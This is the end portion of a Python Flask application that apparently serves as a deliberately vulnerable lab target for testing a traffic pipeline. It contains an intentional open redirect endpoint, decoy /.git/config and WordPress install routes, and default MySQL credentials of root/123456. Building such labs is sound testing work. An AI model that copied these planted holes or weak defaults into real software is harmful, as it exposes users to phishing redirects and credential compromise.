    with get_conn() as conn:
        rows = [dict(x) for x in conn.execute("SELECT id, user_id, sku, amount, created_at FROM orders ORDER BY id DESC LIMIT 30")]
    return jsonify({"ok": True, "items": rows})


@app.post("/api/orders")
def create_order():
    body = request.get_json(silent=True) or {}
    sku = str(body.get("sku", "SKU-000"))[:64]
    amount = int(body.get("amount", 1))
    user_id = int(body.get("user_id", 1001))
    with get_conn() as conn:
        cur = conn.cursor()
        cur.execute(
            "INSERT INTO orders(user_id, sku, amount, created_at) VALUES (?, ?, ?, ?)",
            (user_id, sku, amount, time.time()),
        )
        oid = int(cur.lastrowid)
        conn.commit()
    return jsonify({"ok": True, "order_id": oid}), 201


@app.get("/api/redirect")
def open_redirect():
    nxt = str(request.args.get("next", "/"))
    resp = make_response(jsonify({"ok": True, "next": nxt}), 302)
    resp.headers["Location"] = nxt
    return resp


@app.get("/.git/config")
def git_config():
    return "[core]\nrepositoryformatversion = 0\nbare = false\n", 200, {"Content-Type": "text/plain; charset=utf-8"}


@app.get("/wp-admin/install.php")
def wp_install():
    return "<html><body>WordPress setup</body></html>", 200, {"Content-Type": "text/html; charset=utf-8"}


def main() -> None:
    parser = argparse.ArgumentParser(description="Multi-vulnerability Flask lab for traffic pipeline testing")
    parser.add_argument("--host", default="0.0.0.0")
    parser.add_argument("--port", type=int, default=3000)
    parser.add_argument("--mysql-host", default=os.environ.get("TP_MYSQL_HOST", "127.0.0.1"))
    parser.add_argument("--mysql-port", type=int, default=int(os.environ.get("TP_MYSQL_PORT", "3306")))
    parser.add_argument("--mysql-user", default=os.environ.get("TP_MYSQL_USER", "root"))
    parser.add_argument("--mysql-password", default=os.environ.get("TP_MYSQL_PASSWORD", "123456"))
    parser.add_argument("--mysql-database", default=os.environ.get("TP_MYSQL_DATABASE", "traffic_pipeline"))
    args = parser.parse_args()

    MYSQL_CONF["host"] = args.mysql_host
    MYSQL_CONF["port"] = args.mysql_port
    MYSQL_CONF["user"] = args.mysql_user
    MYSQL_CONF["password"] = args.mysql_password
    MYSQL_CONF["database"] = args.mysql_database

    init_db()
    print(f"[target-multivuln-lab] running on http://{args.host}:{args.port}")
    print(f"[target-multivuln-lab] sqlite db: {DB_PATH}")
    print(
        f"[target-multivuln-lab] mysql blocked-ip source: {MYSQL_CONF['host']}:{MYSQL_CONF['port']}/{MYSQL_CONF['database']}"
    )
    app.run(host=args.host, port=args.port, debug=False, threaded=True)


if __name__ == "__main__":
    main()

